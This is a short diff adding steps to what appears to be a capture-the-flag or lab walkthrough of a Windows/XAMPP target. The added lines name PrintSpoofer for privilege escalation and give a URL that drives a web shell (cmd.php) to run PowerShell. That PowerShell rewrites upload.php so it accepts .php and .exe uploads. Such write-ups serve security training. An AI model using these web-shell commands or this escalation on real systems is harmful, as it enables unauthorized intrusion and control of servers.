@@ -144,5 +144,14 @@ net users
 ![Whoami](./images/whoami.png)<br>
 ![who](./images/apache.png)<br>
 ![Permissions_apache](./images/apace_permissions.png)
+* Hence we wil use [PrintSpoofer](./sources/PrintSpoofer64.exe)
+* Now we can change the permissions for the uploads for resume using
+
+`http://192.168.238.169/cmd.php?cmd=powershell%20-Command%20%22(Get-Content%20C:\xampp\htdocs\upload.php)%20-replace%20\%22array\(%20%27odt%27%20\)\%22,%20\%22array(%20%27odt%27,%20%27php%27,%20%27exe%27%20)\%22%20|%20Set-Content%20C:\xampp\htdocs\upload.php%22`
+
+* now we can directly upload `.exe`,`.php`,.`odt`.
+
+
+
 
 # SOVLED!
